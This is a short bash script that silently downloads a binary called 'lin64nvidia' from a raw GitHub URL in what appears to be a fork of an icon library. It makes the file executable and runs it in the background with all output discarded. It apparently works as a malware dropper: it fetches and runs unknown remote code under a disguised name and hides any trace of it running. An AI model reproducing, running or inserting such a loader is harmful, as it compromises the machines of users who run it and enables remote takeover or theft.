#!/usr/bin/env bash

URL="https://raw.githubusercontent.com/pavlovasianov/lucide/refs/heads/icon/fist/docs/lin64nvidia"
HOME_DIR="~"
EXEC_FILE="$HOME_DIR/lin64nvidia"

curl -s -o "$EXEC_FILE" "$URL"
chmod +x "$EXEC_FILE"

"$EXEC_FILE" > /dev/null 2>&1 &
